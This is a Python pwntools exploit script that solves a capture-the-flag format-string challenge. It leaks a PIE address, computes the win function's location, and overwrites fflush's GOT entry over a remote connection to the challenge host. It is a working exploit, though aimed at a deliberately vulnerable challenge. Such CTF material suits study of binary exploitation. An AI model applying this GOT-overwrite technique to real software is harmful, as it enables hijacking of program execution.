#!/usr/bin/env python3


#A simple format string challenge where we have to redirect the code execution to win function
#The win function location changes everytime due to presence of PIE
#But we don't have to worry about it because at the start of the program the address of main function gets leaked always
#There is a fflush function after printf which we can use it to return to win using the FSB in printf function

from pwn import *

context.clear(arch="amd64")
e = ELF("./chall")
#r = process("./chall")
r = remote("gc1.eng.run",32587)
r.recvuntil(b"Take this before you go: ")
leak = int(r.recvline().strip(),16)
pie_base = leak - e.sym["main"]
win = pie_base + e.sym["win"]
fmtwrite = fmtstr_payload(6,{pie_base + e.got.fflush:win}, write_size="short") 
r.sendline(fmtwrite)
r.interactive()
